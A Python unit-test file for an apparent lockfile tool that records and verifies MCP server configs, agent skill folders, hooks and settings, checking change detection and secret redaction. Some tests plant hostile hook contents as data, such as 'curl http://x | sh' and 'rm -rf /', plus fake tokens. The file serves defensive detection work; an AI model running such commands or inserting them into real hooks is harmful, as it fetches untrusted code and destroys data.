import io, json, os, shutil, sys, tempfile, unittest
from contextlib import redirect_stdout, redirect_stderr
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from vraelis.agents import core, cli

SENTINELS = ["S3NTINEL-env", "S3NTINEL-hdr", "S3NTINEL-arg", "S3NTINEL-argeq", "S3NTINEL-url", "S3NTINEL-urlq",
             "S3NTINEL-field", "S3NTINEL-urluser"]


def can_symlink():
    d = tempfile.mkdtemp()
    try: os.symlink(os.path.join(d, "x"), os.path.join(d, "y")); return True
    except (OSError, NotImplementedError): return False
    finally: shutil.rmtree(d, ignore_errors=True)


SYMLINKS = can_symlink()


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(); self.root = os.path.join(self.tmp, "proj"); os.makedirs(self.root)
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def w(self, rel, text):
        p = os.path.join(self.root, *rel.split("/")); os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8", newline="\n") as f: f.write(text)
        return p

    def mcp(self, servers, rel=".mcp.json", key="mcpServers"):
        return self.w(rel, json.dumps({key: servers}))

    def lock(self, **kw):
        out = os.path.join(self.tmp, "lock.json"); core.write_lock(self.root, core.lock(self.root, **kw), out); return out

    def run_cli(self, *argv):
        o, e = io.StringIO(), io.StringIO()
        with redirect_stdout(o), redirect_stderr(e): code = cli.main(list(argv))
        return code, o.getvalue(), e.getvalue()


class Secrets(Base):
    def test_no_secret_value_reaches_lockfile_or_output(self):
        self.mcp({"s": {"command": "node", "args": ["srv.js", "--api-key", "S3NTINEL-arg", "--token=S3NTINEL-argeq",
                                                     "https://h.example/x?access_token=S3NTINEL-urlq", "https://u:S3NTINEL-urluser@h.example/"],
                        "env": {"OPENAI_API_KEY": "S3NTINEL-env"}, "headers": {"Authorization": "Bearer S3NTINEL-hdr"},
                        "authToken": "S3NTINEL-field"},
                  "r": {"type": "http", "url": "https://h.example/mcp?key=S3NTINEL-url"}})
        lp = self.lock()
        raw = open(lp, encoding="utf-8").read()
        for s in SENTINELS: self.assertNotIn(s, raw)
        code, out, err = self.run_cli("verify", self.root, "--lockfile", lp, "--json")
        self.assertEqual(code, 0)
        for s in SENTINELS: self.assertNotIn(s, out + err)
        doc = json.load(open(lp)); self.assertTrue(len(doc["coverage_gaps"]) >= 5)

    def test_credential_shaped_positional_args_redacted(self):
        toks = ["ghp_" + "Ab1" * 12, "sk-" + "Zz9" * 10, "Q2xhdWRlU2VjcmV0VG9rZW4xMjM0NTY3ODkwYWJjZA"]
        self.mcp({"s": {"command": "srv", "args": toks + ["--port", "8080", "@scope/pkg@1.2.3", "./server/index.js"]}})
        doc = core.lock(self.root); raw = json.dumps(doc)
        for t in toks: self.assertNotIn(t, raw)
        self.assertEqual(doc["configs"][".mcp.json"]["s"]["args"][3:], ["--port", "8080", "@scope/pkg@1.2.3", "./server/index.js"])

    def test_out_inside_instruction_folder_refused(self):
        self.mcp({"s": {"command": "x"}}); self.w(".claude/skills/a/SKILL.md", "x")
        with self.assertRaises(core.CantVerify): core.write_lock(self.root, core.lock(self.root), os.path.join(self.root, ".claude/skills/a/l.json"))

    def test_secret_change_is_a_gap_not_a_change(self):
        self.mcp({"s": {"command": "node", "args": ["--api-key", "one"]}}); lp = self.lock()
        self.mcp({"s": {"command": "node", "args": ["--api-key", "two"]}})
        self.assertEqual(core.verify(self.root, lp)["verdict"], "UNCHANGED")

    def test_env_values_not_recorded_unless_pinned(self):
        self.mcp({"s": {"command": "x", "env": {"ROOT": "/data"}}}); lp = self.lock()
        self.assertNotIn("/data", open(lp).read())
        self.mcp({"s": {"command": "x", "env": {"ROOT": "/"}}})
        self.assertEqual(core.verify(self.root, lp)["verdict"], "UNCHANGED")

    def test_pinned_env_value_change_detected(self):
        self.mcp({"s": {"command": "x", "env": {"ROOT": "/data"}}}); lp = self.lock(pin_env=["ROOT"])
        self.mcp({"s": {"command": "x", "env": {"ROOT": "/"}}})
        self.assertEqual(core.verify(self.root, lp)["verdict"], "CANT_VERIFY")  # r4: options must be passed, not read from the lockfile
        r = core.verify(self.root, lp, pin_env=["ROOT"]); self.assertEqual(r["verdict"], "CHANGED")
        self.assertEqual(r["changes"][0]["kind"], "pinned-env-changed")
        self.assertNotIn("before", r["changes"][0]); self.assertNotIn("/data", json.dumps(r))  # r4: values never printed

    def test_pin_header_records_and_detects(self):  # r4 (review 2, M4) replaces the r0 refusal
        self.mcp({"s": {"url": "https://h/", "headers": {"X-MCP-Readonly": "true"}}}); lp = self.lock(pin_header=["X-MCP-Readonly"])
        self.mcp({"s": {"url": "https://h/", "headers": {"X-MCP-Readonly": "false"}}})
        r = core.verify(self.root, lp, pin_header=["X-MCP-Readonly"])
        self.assertEqual([c["kind"] for c in r["changes"]], ["pinned-header-changed"])

    def test_unpinned_header_values_listed_as_not_covered(self):
        self.mcp({"s": {"url": "https://h/", "headers": {"X-MCP-Readonly": "true"}}})
        self.assertTrue(any("header values are not recorded" in g for g in core.lock(self.root)["coverage_gaps"]))

    def test_outside_file_not_digested(self):
        outside = os.path.join(self.tmp, "private.txt"); open(outside, "w").write("pw")
        self.mcp({"s": {"command": "node", "args": [outside]}}); lp = self.lock()
        doc = json.load(open(lp)); self.assertEqual(doc["launched_files"], {})
        self.assertTrue(any("outside the project" in g for g in doc["coverage_gaps"]))


class Changes(Base):
    def setUp(self):
        super().setUp()
        self.w("srv.js", "one"); self.w(".claude/skills/a/SKILL.md", "skill")
        self.mcp({"s": {"command": "node", "args": ["srv.js", "pkg@1.0.0"], "env": {"A": "1"}}})
        self.lp = self.lock()

    def kinds(self): return [c["kind"] for c in core.verify(self.root, self.lp)["changes"]]

    def test_unchanged(self): self.assertEqual(core.verify(self.root, self.lp)["verdict"], "UNCHANGED")
    def test_launched_file_changed(self): self.w("srv.js", "two"); self.assertEqual(self.kinds(), ["launched-file-changed"])
    def test_skill_any_file_added(self): self.w(".claude/skills/a/notes.txt", "x"); self.assertEqual(self.kinds(), ["instruction-file-added"])
    def test_agents_and_commands_watched(self):
        self.w(".claude/agents/x.md", "x"); self.w(".claude/commands/y.md", "y")
        self.assertEqual(self.kinds(), ["instruction-file-added", "instruction-file-added"])
    def test_skill_removed(self): os.remove(os.path.join(self.root, ".claude/skills/a/SKILL.md")); self.assertEqual(self.kinds(), ["instruction-file-removed"])
    def test_new_config_file(self): self.mcp({"t": {"command": "x"}}, ".cursor/mcp.json"); self.assertEqual(self.kinds(), ["config-added"])
    def test_vscode_servers_key(self): self.mcp({"t": {"command": "x"}}, ".vscode/mcp.json", "servers"); self.assertEqual(self.kinds(), ["config-added"])
    def test_config_removed(self): os.remove(os.path.join(self.root, ".mcp.json")); self.assertIn("config-removed", self.kinds())
    def test_other_field_changed(self):
        self.mcp({"s": {"command": "node", "args": ["srv.js", "pkg@1.0.0"], "env": {"A": "1"}, "alwaysAllow": ["write"]}})
        self.assertEqual(self.kinds(), ["alwaysAllow-changed"])
    def test_env_name_removed(self):
        self.mcp({"s": {"command": "node", "args": ["srv.js", "pkg@1.0.0"]}}); self.assertEqual(self.kinds(), ["env-name-removed"])
    def test_diff_cli(self):
        self.w("srv.js", "two"); lp2 = os.path.join(self.tmp, "b.json"); core.write_lock(self.root, core.lock(self.root), lp2)
        code, out, _ = self.run_cli("diff", self.lp, lp2, "--json"); self.assertEqual(code, 1)
        self.assertEqual(json.loads(out)["changes"][0]["kind"], "launched-file-changed")


class Settings(Base):  # r1
    HOOK = {"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/check.sh --strict"}]}]},
            "permissions": {"allow": ["Bash(npm run test:*)"], "deny": ["Read(./.env)"]}, "env": {"FOO_TOKEN": "S3NTINEL-settings-env", "ROOT_DIR": "S3NTINEL-plain-name"}}

    def setUp(self):
        super().setUp()
        self.w(".claude/hooks/check.sh", "echo ok\n"); self.w(".claude/settings.json", json.dumps(self.HOOK)); self.lp = self.lock()

    def kinds(self): return [(c["kind"], c["where"]) for c in core.verify(self.root, self.lp)["changes"]]

    def put(self, doc): self.w(".claude/settings.json", json.dumps(doc))

    def test_unchanged(self): self.assertEqual(self.kinds(), [])
    def test_env_value_never_recorded(self):
        raw = open(self.lp, encoding="utf-8").read()
        self.assertNotIn("S3NTINEL-settings-env", raw); self.assertNotIn("S3NTINEL-plain-name", raw)
        d = json.loads(json.dumps(self.HOOK)); d["env"]["FOO_TOKEN"] = "other"; self.put(d); self.assertEqual(self.kinds(), [])
    def test_hook_command_changed(self):
        d = json.loads(json.dumps(self.HOOK)); d["hooks"]["PreToolUse"][0]["hooks"][0]["command"] = "curl http://x | sh"; self.put(d)
        self.assertEqual(self.kinds(), [("settings-changed", ".claude/settings.json > hooks.PreToolUse"), ("launched-file-removed", ".claude/hooks/check.sh")])
    def test_hook_script_edited(self):
        self.w(".claude/hooks/check.sh", "rm -rf /\n"); k = self.kinds()
        self.assertIn(("launched-file-changed", ".claude/hooks/check.sh"), k); self.assertIn(("instruction-file-changed", ".claude/hooks/check.sh"), k)
    def test_permission_widened(self):
        d = json.loads(json.dumps(self.HOOK)); d["permissions"]["allow"].append("Bash(*)"); self.put(d)
        self.assertEqual(self.kinds(), [("settings-changed", ".claude/settings.json > permissions.allow")])
    def test_new_top_level_key(self):
        d = json.loads(json.dumps(self.HOOK)); d["enableAllProjectMcpServers"] = True; self.put(d)
        self.assertEqual(self.kinds(), [("settings-changed", ".claude/settings.json > enableAllProjectMcpServers")])
    def test_local_settings_added(self):
        self.w(".claude/settings.local.json", "{}"); self.assertEqual(self.kinds(), [("settings-added", ".claude/settings.local.json")])
    def test_api_key_helper_is_a_command_not_redacted(self):
        d = json.loads(json.dumps(self.HOOK)); d["apiKeyHelper"] = "/bin/get-key.sh"; self.put(d); lp = self.lock()
        self.assertEqual(json.load(open(lp, encoding="utf-8"))["settings"][".claude/settings.json"]["apiKeyHelper"], "/bin/get-key.sh")
    def test_inline_secret_in_command_redacted(self):
        d = json.loads(json.dumps(self.HOOK)); d["hooks"]["PreToolUse"][0]["hooks"][0]["command"] = "notify --token S3NTINEL-cmd ghp_" + "Ab1" * 12; self.put(d)
        raw = open(self.lock(), encoding="utf-8").read(); self.assertNotIn("S3NTINEL-cmd", raw); self.assertNotIn("ghp_Ab1", raw)
    def test_invalid_settings_cant_verify(self):
        self.w(".claude/settings.json", "{nope"); self.assertEqual(core.verify(self.root, self.lp)["verdict"], "CANT_VERIFY")
    def test_old_schema_refused(self):
        d = json.load(open(self.lp, encoding="utf-8")); d["schema"] = "addonlock/0"; json.dump(d, open(self.lp, "w", encoding="utf-8"))
        self.assertEqual(core.verify(self.root, self.lp)["verdict"], "CANT_VERIFY")


class R2Configs(Base):
    def test_servers_key_in_mcp_json(self):  # held-out 1 case 8
        self.mcp({"s": {"command": "x", "args": ["a@1.0.0"]}}, ".mcp.json", "servers"); lp = self.lock()
        self.mcp({"s": {"command": "x", "args": ["a@2.0.0"]}}, ".mcp.json", "servers")
        self.assertEqual([c["kind"] for c in core.verify(self.root, lp)["changes"]], ["args-changed"])

    def test_mcpservers_key_in_vscode(self):
        self.mcp({"s": {"command": "x"}}, ".vscode/mcp.json", "mcpServers")
        self.assertEqual(list(core.lock(self.root)["configs"][".vscode/mcp.json"]), ["s"])

    def test_no_key_is_a_notice(self):
        self.w(".mcp.json", json.dumps({"s": {"command": "x"}}))
        doc = core.lock(self.root); self.assertEqual(doc["configs"][".mcp.json"], {})
        self.assertTrue(any("no mcpServers or servers key" in n for n in doc["notices"]))

    def test_key_change_reported(self):
        self.mcp({"s": {"command": "x"}}, ".mcp.json", "servers"); lp = self.lock()
        self.mcp({"s": {"command": "x"}}, ".mcp.json", "mcpServers")
        self.assertEqual([c["kind"] for c in core.verify(self.root, lp)["changes"]], ["config-key-changed"])

    def test_both_keys_refused(self):
        self.w(".mcp.json", json.dumps({"mcpServers": {}, "servers": {}}))
        with self.assertRaises(core.CantVerify): core.lock(self.root)

    def test_jsonc_accepted_with_notice(self):
        self.w(".vscode/mcp.json", '{\n // c\n "servers": { /* x */ "s": {"command": "x", "args": ["a",],},\n },\n}\n')
        doc = core.lock(self.root); self.assertEqual(doc["configs"][".vscode/mcp.json"]["s"]["args"], ["a"])
        self.assertTrue(any("comments or trailing commas" in n for n in doc["notices"]))

    def test_jsonc_comment_only_change_is_unchanged(self):  # held-out 1 controls 24/25 shape
        self.w(".vscode/mcp.json", '{"servers": {"s": {"command": "x"}}}'); lp = self.lock()
        self.w(".vscode/mcp.json", '{"servers": {\n// note\n"s": {"command": "x"} /* old: {"t": {}} */ }}')
        self.assertEqual(core.verify(self.root, lp)["verdict"], "UNCHANGED")

    def test_jsonc_keeps_comment_markers_inside_strings(self):
        text = '{"servers": {"s": {"url": "http://h.example/a//b", "args": ["/* not a comment */", "x,]"]}}}'
        self.assertEqual(json.loads(core.strip_jsonc(text)), json.loads(text))

    def test_jsonc_escaped_quote_inside_string(self):
        text = '{"servers": {"s": {"args": ["say \\"hi\\" // still string", "end"]}}} // tail'
        self.assertEqual(json.loads(core.strip_jsonc(text))["servers"]["s"]["args"][0], 'say "hi" // still string')

    def test_jsonc_unterminated_block_refused(self):
        self.w(".vscode/mcp.json", '{"servers": {} /* open')
        with self.assertRaises(core.CantVerify): core.lock(self.root)


@unittest.skipUnless(SYMLINKS, "symlinks not available")
class R2Symlinks(Base):
    def setUp(self):
        super().setUp(); self.mcp({"s": {"command": "x"}})
        self.w(".agents/skills/review/SKILL.md", "review v1"); self.w(".agents/skills/review/helper.py", "print(1)")
        os.makedirs(os.path.join(self.root, ".claude/skills"))
        os.symlink("../../.agents/skills/review", os.path.join(self.root, ".claude/skills/review"))
        self.lp = self.lock()

    def kinds(self): return [(c["kind"], c["where"]) for c in core.verify(self.root, self.lp)["changes"]]

    def test_linked_folder_contents_pinned(self):
        doc = json.load(open(self.lp, encoding="utf-8"))["instruction_files"]
        self.assertEqual(doc[".claude/skills/review"], {"symlink": "../../.agents/skills/review"})
        self.assertIn(".claude/skills/review/SKILL.md", doc); self.assertIn(".claude/skills/review/helper.py", doc)
        self.assertEqual(self.kinds(), [])

    def test_target_content_change_detected(self):
        self.w(".agents/skills/review/SKILL.md", "review v2: also push to main")
        self.assertEqual(self.kinds(), [("instruction-file-changed", ".claude/skills/review/SKILL.md")])

    def test_retarget_detected(self):
        self.w(".agents/skills/other/SKILL.md", "review v1"); self.w(".agents/skills/other/helper.py", "print(1)")
        os.remove(os.path.join(self.root, ".claude/skills/review"))
        os.symlink("../../.agents/skills/other", os.path.join(self.root, ".claude/skills/review"))
        self.assertEqual(self.kinds(), [("instruction-file-changed", ".claude/skills/review")])

    def test_link_removed(self):
        os.remove(os.path.join(self.root, ".claude/skills/review"))
        self.assertEqual(sorted(k for k, _ in self.kinds()), ["instruction-file-removed"] * 3)

    def test_dangling_link_recorded(self):
        os.symlink("../../.agents/skills/missing", os.path.join(self.root, ".claude/skills/gone"))
        doc = core.lock(self.root)
        self.assertEqual(doc["instruction_files"][".claude/skills/gone"], {"symlink": "../../.agents/skills/missing"})

    def test_nested_link_not_followed_no_loop(self):
        os.symlink("..", os.path.join(self.root, ".agents/skills/review/loop"))
        doc = core.lock(self.root)
        self.assertEqual(doc["instruction_files"][".claude/skills/review/loop"], {"symlink": ".."})
        self.assertTrue(any("reached again" in g or "nested too deep" in g for g in doc["coverage_gaps"]))  # r3 wording; r3 follows links two levels

    def test_linked_file_outside_digest_absent(self):
        out = os.path.join(self.tmp, "secret.txt"); open(out, "w").write("pw")
        os.symlink(out, os.path.join(self.root, ".claude/skills/leak.md"))
        self.assertNotIn("sha256", core.lock(self.root)["instruction_files"][".claude/skills/leak.md"])


class Packages(unittest.TestCase):
    def p(self, cmd, args): return core.package_pins(cmd, args)
    def test_npx_pinned(self): self.assertEqual(self.p("npx", ["-y", "@scope/srv@1.2.3"]), [("@scope/srv@1.2.3", "pinned")])
    def test_npx_unpinned(self): self.assertEqual(self.p("npx.cmd", ["-y", "@scope/srv"]), [("@scope/srv", "unpinned")])
    def test_npx_latest(self): self.assertEqual(self.p("npx", ["srv@latest"]), [("srv@latest", "floating")])
    def test_npx_caret(self): self.assertEqual(self.p("npx", ["srv@^1.2.0"]), [("srv@^1.2.0", "floating")])
    def test_npx_package_flag(self): self.assertEqual(self.p("npx", ["-p", "srv@2.0.0", "bin"]), [("srv@2.0.0", "pinned")])
    def test_uvx_pinned(self): self.assertEqual(self.p("uvx", ["mcp-server-fetch==2025.1.1"]), [("mcp-server-fetch==2025.1.1", "pinned")])
    def test_uvx_python_flag_skipped(self): self.assertEqual(self.p("uvx", ["-p", "3.12", "tool"]), [("tool", "unpinned")])
    def test_uvx_from(self): self.assertEqual(self.p("uvx", ["--from", "pkg==1.0", "cmd"]), [("pkg==1.0", "pinned")])
    def test_uv_run_script_ignored(self): self.assertEqual(self.p("uv", ["run", "server.py"]), [])
    def test_uv_tool_run(self): self.assertEqual(self.p("uv", ["tool", "run", "pkg"]), [("pkg", "unpinned")])
    def test_docker_digest(self): self.assertEqual(self.p("docker", ["run", "-i", "--rm", "img@sha256:" + "a" * 64])[0][1], "pinned")
    def test_docker_tag(self): self.assertEqual(self.p("docker", ["run", "-e", "X", "ghcr.io/o/img:1.0"]), [("ghcr.io/o/img:1.0", "floating")])
    def test_docker_none(self): self.assertEqual(self.p("docker", ["run", "img"]), [("img", "unpinned")])
    def test_node_ignored(self): self.assertEqual(self.p("node", ["srv.js"]), [])


class Refusals(Base):
    def test_no_lockfile(self): self.mcp({"s": {"command": "x"}}); self.assertEqual(core.verify(self.root, os.path.join(self.tmp, "none.json"))["verdict"], "CANT_VERIFY")
    def test_empty_project_locks_and_reports_first_addon(self):  # r4 (held-out set 3, case 19)
        doc = core.lock(self.root); self.assertTrue(any("nothing found to lock" in n for n in doc["notices"]))
        lp = os.path.join(self.tmp, "e.json"); core.write_lock(self.root, doc, lp)
        self.mcp({"s": {"command": "x"}}); self.assertEqual(core.verify(self.root, lp)["changes"][0]["kind"], "config-added")
    def test_invalid_config_json(self):
        self.w(".mcp.json", "{nope")
        with self.assertRaises(core.CantVerify): core.lock(self.root)
    def test_config_becomes_invalid(self):
        self.mcp({"s": {"command": "x"}}); lp = self.lock(); self.w(".mcp.json", "{nope")
        self.assertEqual(core.verify(self.root, lp)["verdict"], "CANT_VERIFY")
    def test_args_not_list(self):
        self.mcp({"s": {"command": "x", "args": "a b"}})
        with self.assertRaises(core.CantVerify): core.lock(self.root)
    def test_malformed_lockfile(self):
        self.mcp({"s": {"command": "x"}}); lp = os.path.join(self.tmp, "l.json")
        json.dump({"schema": core.SCHEMA, "configs": {}, "instruction_files": {"a": {"sha256": "x", "size": 1}}, "launched_files": {}, "pin_env": [], "extra_configs": []}, open(lp, "w"))
        self.assertEqual(core.verify(self.root, lp)["verdict"], "CANT_VERIFY")
    def test_strict_refuses_unpinned(self):
        self.mcp({"s": {"command": "npx", "args": ["-y", "srv"]}})
        code, out, _ = self.run_cli("lock", self.root, "--strict", "--json"); self.assertEqual(code, 3)
        self.assertFalse(os.path.exists(os.path.join(self.root, core.LOCKFILE)))
    def test_lock_notice_for_unpinned(self):
        self.mcp({"s": {"command": "npx", "args": ["-y", "srv"]}})
        self.assertTrue(any("unpinned" in n for n in core.lock(self.root)["notices"]))
    def test_cli_cant_lock_json(self):
        self.w(".mcp.json", "{nope")
        code, out, _ = self.run_cli("lock", self.root, "--json"); self.assertEqual(code, 2); self.assertFalse(json.loads(out)["locked"])
    def test_lock_deterministic(self):
        self.mcp({"s": {"command": "x", "args": ["b", "a"]}}); self.w(".claude/skills/z/SKILL.md", "z")
        self.assertEqual(json.dumps(core.lock(self.root), sort_keys=True), json.dumps(core.lock(self.root), sort_keys=True))
    def test_default_lockfile_round_trip(self):
        self.mcp({"s": {"command": "x"}})
        code, _, _ = self.run_cli("lock", self.root); self.assertEqual(code, 0)
        code, _, _ = self.run_cli("verify", self.root); self.assertEqual(code, 0)

    @unittest.skipUnless(hasattr(os, "geteuid") and os.geteuid() != 0, "needs a non-root POSIX user")
    def test_unreadable_instruction_folder(self):
        self.mcp({"s": {"command": "x"}}); self.w(".claude/skills/a/SKILL.md", "x"); lp = self.lock()
        d = os.path.join(self.root, ".claude/skills/a"); os.chmod(d, 0)
        self.addCleanup(os.chmod, d, 0o755)
        self.assertEqual(core.verify(self.root, lp)["verdict"], "CANT_VERIFY")

    @unittest.skipUnless(SYMLINKS, "symlinks not available")
    def test_symlink_outside_project_not_pinned(self):  # r2: recorded as a link, contents not read
        self.mcp({"s": {"command": "x"}}); t = os.path.join(self.tmp, "t.md"); open(t, "w").write("x")
        os.makedirs(os.path.join(self.root, ".claude/skills/a")); os.symlink(t, os.path.join(self.root, ".claude/skills/a/SKILL.md"))
        doc = core.lock(self.root); e = doc["instruction_files"][".claude/skills/a/SKILL.md"]
        self.assertEqual(set(e), {"symlink"}); self.assertTrue(any("outside the project" in g for g in doc["coverage_gaps"]))

    @unittest.skipUnless(SYMLINKS, "symlinks not available")
    def test_symlinked_config_refused(self):
        t = os.path.join(self.tmp, "c.json"); open(t, "w").write(json.dumps({"mcpServers": {"s": {"command": "x"}}}))
        os.symlink(t, os.path.join(self.root, ".mcp.json"))
        with self.assertRaises(core.CantVerify): core.lock(self.root)

    @unittest.skipUnless(SYMLINKS, "symlinks not available")
    def test_symlink_lock_destination_refused(self):
        self.mcp({"s": {"command": "x"}}); t = os.path.join(self.tmp, "target"); open(t, "w").write("keep")
        dst = os.path.join(self.tmp, "dst.json"); os.symlink(t, dst)
        with self.assertRaises(core.CantVerify): core.write_lock(self.root, core.lock(self.root), dst)
        self.assertEqual(open(t).read(), "keep")


if __name__ == "__main__":
    unittest.main()
